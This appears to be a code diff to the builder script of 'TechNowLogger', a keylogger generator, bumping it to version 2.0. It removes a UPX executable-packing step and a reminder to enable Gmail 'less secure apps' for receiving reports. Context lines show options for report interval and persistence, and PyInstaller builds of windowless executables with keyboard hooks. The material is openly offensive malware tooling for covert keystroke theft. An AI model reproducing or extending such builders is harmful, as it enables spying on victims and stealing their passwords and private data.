@@ -20,7 +20,7 @@ elif platform.system() == 'Linux':
     WINDOWS_PYTHON_PYINSTALLER_PATH = "wine ~/.wine/drive_c/Python37-32/Scripts/pyinstaller.exe"
 
 def get_arguments():
-    parser = argparse.ArgumentParser(description=f'{Fore.RED}TechNowLogger v1.9')
+    parser = argparse.ArgumentParser(description=f'{Fore.RED}TechNowLogger v2.0')
     parser._optionals.title = f"{Fore.GREEN}Optional Arguments{Fore.YELLOW}"
     parser.add_argument("-i", "--interval", dest="interval", help="Time between reports in seconds. default=120", default=120)
     parser.add_argument("-t", "--persistence", dest="time_persistent", help="Becoming Persistence After __ seconds. default=10", default=10)    
@@ -222,17 +222,6 @@ def compile_for_linux(file_name, icon_path):
     else:
         subprocess.call(f"pyinstaller --onefile --noconsole --hidden-import=pynput.keyboard --hidden-import=keylogger {file_name} -i {icon_path}", shell=True)
 
-def pack_exe_using_upx():
-    if os.path.exists(os.getcwd() + "\\upx\\upx.exe") and os.path.exists(os.getcwd() + f"\\dist\\{arguments.out}.exe"):
-        shutil.copy2(f"{os.getcwd()}\\upx\\upx.exe", f"{os.getcwd()}\\dist")
-        os.chdir(f"{os.getcwd()}\\dist") 
-        
-        print(f"{Fore.YELLOW}\n[*] Packing Exe Using UPX")
-        os.system(f"upx.exe {arguments.out}.exe > log.txt")
-        os.remove("log.txt")
-        os.remove("upx.exe")
-        print(f"{Fore.GREEN}[+] Packed Successfully !")
-
 def del_junk_file(file_name):
     try:
         if platform.system() == 'Windows':        
@@ -363,10 +352,6 @@ if __name__ == '__main__':
         if os.path.exists(f'dist/{arguments.out}.exe') or os.path.exists(f'dist/{arguments.out}') or os.path.exists(f'~/opt/technowloogger/dist/{arguments.out}.exe') or os.path.exists(f'{os.getcwd()}\\dist\\{arguments.out}.exe'):
             print(f"\n{Fore.GREEN}[+] Generated Successfully!\n")
 
-            pack_exe_using_upx()
-            
-            print(f"\n\n{Fore.RED}[***] Don't forget to allow less secure applications in your Gmail account.")
-            print(f"{Fore.GREEN}Use the following link to do so https://myaccount.google.com/lesssecureapps")
             print(f"\n{Fore.RED} :O-) TIP{Fore.YELLOW} : USE ICONS from {Fore.RED}icon{Fore.YELLOW} folder like this >>  {Fore.RED}--icon icon/exe.ico")
 
         else:
